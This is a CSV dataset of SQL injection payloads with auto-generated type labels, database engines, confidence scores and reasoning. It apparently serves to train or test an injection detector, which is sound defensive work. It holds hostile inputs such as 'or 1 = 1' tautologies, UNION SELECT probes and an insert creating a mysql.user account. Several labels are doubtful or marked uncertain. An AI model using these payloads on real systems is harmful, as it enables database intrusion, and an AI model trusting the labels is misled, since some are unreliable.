id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18144,select name from syscolumns where id = ( select id from sysobjects where name = tablename' ) --,boolean_blind,mssql,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'select name from syscolumns where id = ( select id from sysobjects where name = '",3
18145,\x27UNION SELECT,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: '\\x27UNION SELECT'",3
18146,char@39A+@SELECT,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: 'char@39A+@SELECT'",3
18147,"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",boolean_blind,generic,0.85,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=generic. Payload contains: '1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055'",2
18148,truncate,benign,generic,0.7,No injection tokens found in payload; treated as benign. Payload snippet: 'truncate',3
18149,"select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",boolean_blind,generic,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=generic. Payload contains: 'select * from users where id = 1 or "", ( "" or 1 = 1 -- 1'",3
18150,"select * from users where id = 1 or "",{"" or 1 = 1 -- 1",boolean_blind,generic,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=generic. Payload contains: 'select * from users where id = 1 or "",{"" or 1 = 1 -- 1'",3
18151,"insert into mysql.user ( user, host, password ) values ( 'name', 'localhost', password ( 'pass123' ) )",boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: ""insert into mysql.user ( user, host, password ) values ( 'name', 'localhost', pa""",3
18152,exec sp,benign,generic,0.7,No injection tokens found in payload; treated as benign. Payload snippet: 'exec sp',3
18153,1;SELECT *,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: '1;SELECT *'",3
18154,procedure,benign,generic,0.7,No injection tokens found in payload; treated as benign. Payload snippet: 'procedure',3
18155,\'; desc users; --,benign,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=benign, C=benign agree. Payload snippet: ""\\'; desc users; --""",3
18156,1 uni on select all from where,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: '1 uni on select all from where'",3
18157,"select * from users where id = 1 or @#"", = 1 union select 1,version ( ) -- 1",union_based,generic,0.95,"Token 'UNION SELECT' → union_based (priority 7); DB=generic. Payload contains: 'select * from users where id = 1 or @#"", = 1 union select 1,version ( ) -- 1'",3
18158,"select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",boolean_blind,generic,0.95,"Token 'AND/OR N=N or LIKE or RLIKE/ELT/IF' → boolean_blind (priority 3); DB=generic. Payload contains: 'select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1'",3
18159,sqlvuln;,benign,generic,0.7,No injection tokens found in payload; treated as benign. Payload snippet: 'sqlvuln;',3
18160,( select top 1,boolean_blind,generic,0.6,"UNCERTAIN: no strong rule match. Sources A=boolean_blind, C=boolean_blind agree. Payload snippet: '( select top 1'",3
